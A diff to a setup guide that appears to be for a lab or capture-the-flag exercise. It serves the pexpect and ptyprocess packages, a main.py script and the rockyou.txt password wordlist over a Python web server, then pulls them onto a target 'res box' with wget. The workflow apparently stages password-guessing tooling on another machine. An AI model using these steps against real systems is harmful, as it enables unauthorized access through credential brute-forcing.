@@ -6,7 +6,7 @@ First you will need to make sure you have pexpect installed locally:
 pip install pexpect
 ```
 
-Then run the set of commands to cp the pexpect adn ptyprocess folders:
+Then run the set of commands to cp the pexpect and ptyprocess folders:
 
 ```
 find / -name 'pexpect' 2>/dev/null
@@ -23,6 +23,11 @@ tar -zcvf pexpect.tar.gz pexpect
 tar -zcvf ptyprocess.tar.gz ptyprocess
 ```
 
+Copy rockyou.txt:
+```
+cp /usr/share/wordlists/rockyou.txt .
+```
+
 Then start a pthon web server:
 ```
 python3 -m http.server 8080
@@ -30,9 +35,10 @@ python3 -m http.server 8080
 
 On the res box run the following wget command while in the /var/www/html folder:
 ```
-wget http:IP_ADDRESS:8080/main.py
-wget http:IP_ADDRESS:8080/pexpect.tar.gz
-wget http:IP_ADDRESS:8080/ptyprocess.tar.gz
+wget http://IP_ADDRESS:8080/main.py
+wget http://IP_ADDRESS:8080/rockyou.txt
+wget http://IP_ADDRESS:8080/pexpect.tar.gz
+wget http://IP_ADDRESS:8080/ptyprocess.tar.gz
 ```
 
 Now unzip the folders:
